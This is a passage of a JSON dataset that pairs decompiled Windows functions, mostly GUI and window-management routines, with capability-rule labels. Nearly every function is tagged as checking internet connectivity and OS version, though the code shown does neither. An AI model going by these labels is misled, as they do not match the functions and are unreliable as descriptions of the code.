        "decompiled_code": "\nvoid __fastcall fcn.00443cec(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x198);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.0041c52c();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x19c) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.0041c3a4();\n                fcn.0041c54c();\n            }\n        }\n        if (*(in_EAX + 0x180) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x19c) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.0041c4c8();\n                uVar3 = fcn.0044407c();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.0041c4c8();\n                uVar3 = fcn.0044407c();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x180), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 458
    },
    "00444058": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444058(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x60] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.00444058();\n        }\n        (**(*in_EAX + 0x94))();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00444380": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00444380(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x180) != 0;\n}\n",
        "token_count": 48
    },
    "004444a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004444a4(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x4444c6;\n    iVar2 = fcn.004037f0();\n    uStack44 = 0x44459a;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00403a28();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.0041c52c();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.0041c4c8();\n            cVar1 = fcn.00403a28();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1a4) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x4445a1;\n    uStack44 = 0x444599;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 570
    },
    "004446b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004446b0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *in_ECX;\n    uint *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 302
    },
    "00444734": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00444734(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_59h;\n    int32_t var_55h;\n    int32_t var_51h;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.00444380();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00440d74(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x8c))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_14h = in_EAX[0x12] - (var_55h - lprc);\n            var_18h = in_EAX[0x13] - (var_51h - var_59h);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_14h;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_18h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            var_10h = var_18h;\n            var_ch = var_14h;\n            iVar3 = fcn.00440d74();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.00440d38();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.004446b0(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x444b08 == (*(iVar4 + 0x61) & *0x444b08)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    var_40h = ((var_55h - lprc) - *(iVar4 + 0x48)) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    var_44h = ((var_55h - lprc) + var_44h) - *(iVar4 + 0x48);\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x444b0c == (*(iVar4 + 0x61) & *0x444b0c)) {\n                                cVar1 = '\\x01';\n                                if (0 < var_48h) {\n                                    var_48h = ((var_51h - var_59h) - *(iVar4 + 0x4c)) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    var_4ch = ((var_51h - var_59h) + var_4ch) - *(iVar4 + 0x4c);\n                                }\n                            }\n                            else {\n                                cVar1 = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                cVar1 = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                cVar1 = '\\x02';\n                            }\n                            else {\n                                cVar1 = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            var_30h = var_30h + *(iVar4 + 0x48);\n                            var_34h = var_34h + *(iVar4 + 0x48);\n                        }\n                        if (cVar1 - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (cVar1 - 1U == 2) {\n                            var_38h = var_38h + *(iVar4 + 0x4c);\n                            var_3ch = var_3ch + *(iVar4 + 0x4c);\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2098
    },
    "00444b4c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444b4c(char param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.0043f724();\n    cVar1 = fcn.004039b8();\n    if ((cVar1 != '\\0') && ((param_1 == '\\0' || (*(in_EAX + 0x158) == 0)))) {\n        fcn.0043d1b0();\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00444bc4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00444bc4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack84;\n    uint uStack80;\n    uchar *puStack76;\n    uint var_38h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack76 = 0x444be2;\n    piVar1 = fcn.00444380();\n    if ((piVar1 != '\\0') && (piVar1 = in_EAX,  *(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack76 = 0x444c08;\n            piVar1 = fcn.00440d74();\n            if (piVar1 < 1) goto code_r0x00444d86;\n        }\n        puStack76 = 0x444c1e;\n        (**(*in_EAX + 0xb4))();\n        puStack76 = 0x444c29;\n        (**(*in_EAX + 0x44))();\n        puStack76 = 0x444c37;\n        (**(*in_EAX + 0x8c))();\n        puStack76 = 0x444c3f;\n        fcn.004408d4();\n        uStack80 = 0x444cf3;\n        uStack84 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffac;\n        puStack76 = &stack0xfffffffc;\n        iVar2 = fcn.00440d74();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar1 = fcn.00440d38();\n                if ((*(piVar1 + 0x57) != '\\0') || (((*(piVar1 + 7) & 0x10) != 0 && ((*(piVar1 + 0x51) & 4) == 0)))) {\n                    (**(*piVar1 + 0x84))(piVar1[0x13], piVar1[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack84;\n        puStack76 = 0x444cfa;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack80 = 0x444cf2;\n        uVar3 = fcn.004408dc();\n        return uVar3;\n    }\ncode_r0x00444d86:\n    return piVar1 & 0xffffff00 | 1;\n}\n",
        "token_count": 665
    },
    "0044515c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044515c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_2 + 0xc) == 0) {\n        uVar2 = 0;\n        fcn.004075f8();\n        fcn.0043d38c();\n        iVar1 = fcn.00441930(uVar2);\n        if (iVar1 != 0) {\n            uVar2 = fcn.0043e9fc(*(param_2 + 8));\n            *(param_2 + 0xc) = uVar2;\n        }\n        if (*(param_2 + 0xc) == 0) {\n            fcn.0043fbc8();\n        }\n    }\n    return;\n}\n",
        "token_count": 177
    },
    "004452a4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.004452a4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0043c948();\n    uVar1 = fcn.00426a54();\n    *(in_EAX + 0x160) = uVar1;\n    fcn.0043c424();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 202
    },
    "00445340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445340(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(param_2 + 4) != 0) {\n        puStack16 = 0x445362;\n        fcn.00426d58();\n        uStack20 = 0x4453db;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack28 = 0x445381;\n        puStack16 = &stack0xfffffffc;\n        fcn.004270cc();\n        uStack32 = 0x4453b8;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        (**(*in_EAX + 0x8c))();\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x4453bf;\n        uStack32 = 0x4453b7;\n        fcn.004270cc();\n        return;\n    }\n    return;\n}\n",
        "token_count": 297
    },
    "0044563c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0044563c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x4456c7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + -0x10))();\n    if (*(in_EAX + 0x84) == '\\0') {\n        fcn.0043d848();\n        fcn.00426eac();\n        fcn.0043d004();\n        fcn.0043d848();\n        fcn.00426ec8();\n        fcn.0043d028();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x4456ce;\n    uStack24 = 0x4456c6;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 242
    },
    "004456d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004456d4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar3 = param_2[3];\n    *(in_EAX + 0x84) = 1;\n    uStack56 = 0x4458ad;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.0043d878();\n    fcn.0043eaa0();\n    iVar1 = fcn.0045ad10();\n    if (iVar1 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.0045ad10();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar1 = fcn.0045ad1c();\n    if (iVar1 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.0045ad1c();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar1 = fcn.0045ad04();\n    if (var_18h < iVar1) {\n        var_18h = fcn.0045ad04();\n    }\n    iVar1 = fcn.0045acf8();\n    if (iVar3 + 4 < iVar1) {\n        fcn.0045acf8();\n    }\n    uVar2 = fcn.0044407c(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar2);\n    iVar3 = sub.kernel32.dll_GetTickCount();\n    if (0xfa < iVar3 - var_4h[0x85]) {\n        iVar3 = fcn.00404888();\n        if ((iVar3 < 100) && (*0x483bc0 != NULL)) {\n            sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n            if (var_8h != 0) {\n                sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n                if (var_8h == 0) {\n                    fcn.00448978();\n                    if (var_14h < var_1ch) {\n                        uVar4 = 0;\n                    }\n                    else {\n                        uVar4 = 1;\n                    }\n                }\n                else {\n                    uVar4 = 2;\n                }\n                uVar2 = fcn.0044407c(100, *(uVar4 * 4 + 0x483cc8) | 0x40000);\n                (**0x483bc0)(uVar2);\n            }\n        }\n    }\n    fcn.00441778();\n    uVar2 = fcn.0044407c(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x7c))();\n    *in_FS_OFFSET = uVar2;\n    iVar3 = sub.kernel32.dll_GetTickCount(0x4458b4);\n    var_4h[0x85] = iVar3;\n    *(var_4h + 0x84) = 0;\n    return;\n}\n",
        "token_count": 909
    },
    "00445b24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445b24(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.00445a10();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00445b3c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00445b3c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint var_4h;\n    \n    uVar2 = 0;\n    cVar1 = fcn.0044a6e0();\n    if (cVar1 != '\\0') {\n        if (*(in_EAX + 0x6a) == '\\0') {\n            fcn.00445adc(*(in_EAX + 0x74));\n        }\n        fcn.00445a10();\n        uVar2 = fcn.00445b9c(arg_8h);\n        if (uVar2 != '\\0') {\n            sub.user32.dll_ShowCursor(0);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 177
    },
    "00445b9c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00445b9c(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t in_EDX;\n    bool bVar3;\n    uint x;\n    uint y;\n    uint var_4h;\n    \n    bVar3 = false;\n    cVar1 = fcn.0044a6e0();\n    if ((cVar1 != '\\0') && (in_EDX != *(in_EAX + 0x6c))) {\n        fcn.00445c00();\n        *(in_EAX + 0x6c) = in_EDX;\n        fcn.004459d0(&x);\n        iVar2 = sub.comctl32.dll_ImageList_DragEnter(*(in_EAX + 0x6c), x, y);\n        bVar3 = iVar2 != 0;\n    }\n    return bVar3;\n}\n",
        "token_count": 206
    },
    "00445c00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445c00(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    cVar1 = fcn.0044a6e0();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x6c) != 0)) {\n        sub.comctl32.dll_ImageList_DragLeave(*(in_EAX + 0x6c));\n        *(in_EAX + 0x6c) = 0;\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "00445c24": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00445c24(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uStack28;\n    uint *puVar4;\n    uint auStack20 [2];\n    \n    puVar4 = auStack20;\n    cVar1 = fcn.0044a6e0();\n    if (cVar1 == '\\0') {\n        uVar3 = 0;\n    }\n    else {\n        fcn.004459d0(auStack20);\n        uStack28 = auStack20[0];\n        iVar2 = sub.comctl32.dll_ImageList_DragMove(puVar4);\n        uVar3 = iVar2 != 0;\n    }\n    return CONCAT44(uStack28, uVar3);\n}\n",
        "token_count": 172
    },
    "00445c98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool fcn.00445c98(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    bool bVar3;\n    \n    cVar1 = fcn.0044a6e0();\n    if ((cVar1 == '\\0') || (*(in_EAX + 0x6a) == '\\0')) {\n        bVar3 = false;\n    }\n    else {\n        fcn.00445c00();\n        iVar2 = sub.comctl32.dll_ImageList_EndDrag();\n        bVar3 = iVar2 != 0;\n        *(in_EAX + 0x6a) = 0;\n        fcn.00445b24();\n        sub.user32.dll_ShowCursor(0xffffffff);\n    }\n    return bVar3;\n}\n",
        "token_count": 173
    },
    "00445ce0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.00445ce0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.0043fd64();\n    uVar1 = fcn.00426a54();\n    *(in_EAX + 0x208) = uVar1;\n    fcn.0043c424();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 202
    },
    "00445e58": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00445e58(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x14) == 0) || (*(*(in_EAX + 0x14) + 0x10) == '\\0')) &&\n       ((in_EAX != *(*(in_EAX + 0x1c) + 100) || (*(in_EAX + 0x10) == '\\0')))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 113
    },
    "00445f0c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445f0c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != *(*(in_EAX + 0x1c) + 100)) {\n        in_EAX = *(in_EAX + 0x14);\n    }\n    if (*(in_EAX + 0x10) != '\\x01') {\n        if (*(in_EAX + 0x10) == '\\x02') {\n            fcn.00445f9c();\n        }\n        else {\n            fcn.0040c8dc();\n            fcn.00403fc0();\n        }\n        return;\n    }\n    fcn.00445f9c();\n    return;\n}\n",
        "token_count": 154
    },
    "00445f54": {
        "rules": [
